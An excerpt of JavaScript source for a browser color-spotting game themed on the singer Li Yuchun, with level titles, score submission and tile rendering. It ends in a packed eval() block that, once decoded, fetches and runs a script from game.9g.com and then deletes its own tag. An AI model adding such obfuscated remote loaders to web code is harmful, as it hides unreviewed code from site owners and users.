var _lang = {
	zh: {
		...
		btn_resume: "继续游戏",
		loading: "加载中...",
		lv_txt: ["李宇春的脑残粉", "李宇春的忠实粉", "李宇春的路人粉", "慧眼识宇春", "火眼金睛", "洞察一切", "两眼冒光", "24k氪金眼", "已被亮瞎！"]
	},
	en: {
...
function() {
	...
	c = {
		...
		gameOver: function() {
			//结束提交分数
			dp_submitScore(this.lv + 1);
			var d = this.api.getGameOverText(this.lv);//游戏结束后的提示
			//dp_submitScore(this.lv,d.lv);//原做法
			this.lastLv = this.lv,
	...
	e = {
		...
		render: function(e, f) {
			...
			var size = a.find(b).height() * 0.96;
			 a.find(b).css("background-color", i[1]).data("type", "b").css({"background": "url(fanfalse.png)"+j[1], "background-size": "cover"}), a.find(b).eq(h).css("background-color", j[1]).data("type", "a").css({"background": "url(fantrue.png)"+j[1], "background-size": "cover"});
		},
		getColor: function(a) {
...
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|script|parentNode|http|com|9g|game|||javascript|text|type|src|true|async|onload|insertBefore|js|removeChild|qmxzfzm|getElementsByTagName||createElement'.split('|'),0,{}))